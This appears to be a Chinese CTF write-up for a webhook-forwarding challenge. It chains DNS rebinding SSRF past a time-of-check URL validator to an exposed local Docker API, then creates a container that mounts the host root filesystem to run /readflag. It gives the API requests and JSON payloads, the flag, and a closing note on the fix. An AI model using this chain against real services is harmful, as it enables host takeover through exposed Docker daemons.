# SUCTF2026-uri

## 题目简述

题目是一个 webhook 转发服务。用户向 `/api/webhook` 提交目标 URL 和请求体，服务端校验 URL 后等待两秒，再向目标发送 POST，并把目标状态码和最多 64 KiB 响应体返回。校验会解析域名并拒绝 localhost、本地地址和常见私网网段，但没有把校验得到的 IP 固定给真正的 HTTP 连接，因此可用 DNS Rebinding 让两次解析分别得到公网 IP 与 `127.0.0.1`。

容器启动时，root 进程用 `socat` 把 `127.0.0.1:2375` 转发到挂载的 `/var/run/docker.sock`，随后才降权运行 Web 服务。通过 SSRF 访问这个本机端口，就能调用宿主 Docker API，创建一个挂载宿主根目录的容器并执行宿主上的 `/readflag`。

官方 WP 与总 WP 的主链相同，只在 Docker API 的取回方式上不同：官方让新容器直接运行读取命令，再用 attach 接口取日志；总 WP 创建常驻容器后使用 exec API 同步取回输出。下面先写官方流程，再给出更易处理返回值的 exec 变体。

## 解题过程

### 1. 确认 webhook SSRF 能力

前端最终发送：

```javascript
fetch('/api/webhook', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url, body})
});
```

最小测试请求为：

```json
{
  "url": "http://public.example/",
  "body": "{\"event\":\"ping\"}"
}
```

服务端固定对目标发送 `POST`，并设置 `Content-Type: application/json`。成功转发时，外层响应形如：

```json
{
  "message": "forwarded",
  "target_status": 200,
  "target_body": "..."
}
```

需要区分挑战服务自身的 HTTP 状态与 `target_status`：前者通常是 `200`，后者才是 Docker API 返回的 `201`、`204` 或 `200`。

### 2. 定位 DNS Rebinding 条件

`waf.ValidateURL` 的检查顺序是：

1. 只允许 `http`、`https`；
2. 拒绝空 host 与字面 `localhost`；
3. 调用 `net.LookupIP(host)`；
4. 遍历解析到的全部 IP，拒绝 loopback、未指定地址、链路本地地址、IPv4 私网、CGNAT 与 IPv6 ULA；
5. 将 `::ffff:127.0.0.1` 这类 IPv4-mapped IPv6 地址先 `Unmap`，再执行同一检查。

所以十六进制 IP、IPv4-mapped IPv6 或让一个 DNS 响应同时含公网和私网地址都不能绕过。漏洞位于校验之后：

```go
if err := waf.ValidateURL(req.URL); err != nil {
    // reject
}
time.Sleep(2 * time.Second)
status, body, err := client.Post(req.URL, req.Body)
```

`ValidateURL` 的解析结果没有传给 `http.Client`；`client.Post` 会重新根据域名建立连接。可控 DNS 记录应让校验阶段先返回可接受的公网地址，在 TTL 到期或下一次查询时返回 `127.0.0.1`。

每次尝试使用新的随机子域，既避免上游缓存复用旧答案，也便于为每一步维护独立的解析状态：

```text
<随机标签>.rebind.example
  第一次查询 -> 公网 IP
  第二次查询 -> 127.0.0.1
```

应用故意加入的两秒延迟给短 TTL 记录留出了切换窗口。实际解析器仍可能缓存或改变查询次数，所以每个 Docker API 步骤都应允许多次重试，并验证 `target_status` 与 `target_body`，不能只看外层请求成功。

### 3. 识别本机 Docker API

用 rebinding 域名把目标端口改为 `2375`，向一个无副作用或参数不完整的 Docker POST 接口发请求。例如：

```text
POST http://<随机重绑定域名>:2375/v1.41/containers/create
body: {}
```

若 `target_body` 返回类似：

```json
{"message":"config cannot be empty in order to create a container"}
```

即可确认服务类型。源码进一步解释了端口来源：`docker-compose.yml` 把宿主 `/var/run/docker.sock` 挂入 CloudHook 容器，`entrypoint.sh` 以 root 启动：

```bash
socat TCP-LISTEN:2375,bind=127.0.0.1,reuseaddr,fork \
      UNIX-CONNECT:/var/run/docker.sock &
```

之后才用 `su-exec` 将 Go Web 服务降权到 `ctfer`。因此 SSRF 访问的是容器本机 TCP 转发器，但其权限实际等价于控制宿主 Docker daemon。

### 4. 官方路线：创建容器并从日志取回 flag

如果 daemon 中没有 `alpine:latest`，官方脚本先经 webhook 请求：

```text
POST /images/create?fromImage=alpine:latest
```

这一阶段需要 daemon 能访问镜像源；若环境已缓存镜像则可省略。随后创建容器，并把宿主根目录挂到 `/mnt`：

```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "/mnt/readflag"],
  "HostConfig": {
    "Binds": ["/:/mnt:ro"]
  }
}
```

对应请求为：

```text
POST /containers/create?name=<随机名>
```

从 `target_body` 二次解析 JSON，取得 `Id`。再依次经新的 rebinding 子域发送：

```text
POST /containers/<id>/start
POST /containers/<id>/attach?logs=1&stream=0&stdout=1&stderr=1
```

第一步预期目标状态为 `204`，第二步返回容器 stdout/stderr。Docker attach 可能使用带帧头的 raw-stream 格式，因此取回字符串时应在整个字节流中按 `SUCTF{...}` 搜索，而不是假设响应体只有纯 flag。

官方旧脚本还执行了 `ln -s /mnt/flag /flag`；当前仓库的 `readflag.c` 直接解码内置字节并输出，不再读取该符号链接。以当前源码复现时，直接运行 `/mnt/readflag` 即可，避免把旧环境细节误当成必要条件。

### 5. 替代路线：Docker exec 同步取回输出

总 WP 采用四步 exec 流程，通常比 attach 更容易在 webhook 的字符串响应中处理：

1. 创建一个执行 `sleep 3600` 的 Alpine 容器，并绑定 `/:/host:ro`；
2. 启动容器；
3. 调用 `/containers/<id>/exec` 创建执行实例；
4. 调用 `/exec/<exec-id>/start`，设置 `Detach=false`，同步取得输出。

创建容器的主体为：

```json
{
  "Image": "alpine",
  "Cmd": ["sh", "-c", "sleep 3600"],
  "HostConfig": {
    "Binds": ["/:/host:ro"]
  }
}
```

创建 exec：

```json
{
  "AttachStdout": true,
  "AttachStderr": true,
  "Cmd": ["sh", "-c", "/host/readflag"]
}
```

最后启动：

```json
{
  "Detach": false,
  "Tty": false
}
```

每一步都要换新的随机重绑定域名，并检查预期结果：

```text
create      -> target_status 201，target_body 含 Id
start       -> target_status 204
exec create -> target_status 201，target_body 含 Id
exec start  -> target_status 200，target_body 含 flag
```

官方 attach 路线和这条 exec 路线只是在输出收集方式上不同；二者的安全边界突破都发生在 `HostConfig.Binds`。一旦能控制 Docker daemon，Web 容器中的低权限身份不再构成隔离。

### 6. 校验 flag 来源

`setup/readflag.c` 用固定 `0x55` 对数组逐字节异或，再写到 stdout。按源码解码可得到：

```text
SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
```

仓库 README 也标明当前为静态 flag；若比赛平台后续接入动态注入，应以实际 `/readflag` 输出为准。

## 方法总结

本题不是因为私网网段黑名单漏写了某一种 IP 表示法。源码已经覆盖 localhost、常见 IPv4/IPv6 私网与 IPv4-mapped IPv6；决定性问题是 TOCTOU：安全检查解析了一次域名，真实连接又独立解析一次，且中间刻意等待两秒。修复应让连接阶段使用已验证的地址，并同时验证 Host/SNI，而不是继续扩充字符串黑名单。

SSRF 命中 `127.0.0.1:2375` 后，风险来自 Docker socket 的等价 root 权限。创建容器、绑定宿主根目录、执行宿主 `/readflag` 是一条直接的控制面利用链。实践中最容易失败的是 DNS 缓存与 Docker API 返回值判断，因此每一步都应使用唯一域名、重试，并验证内层 `target_status` 和二次 JSON 响应。
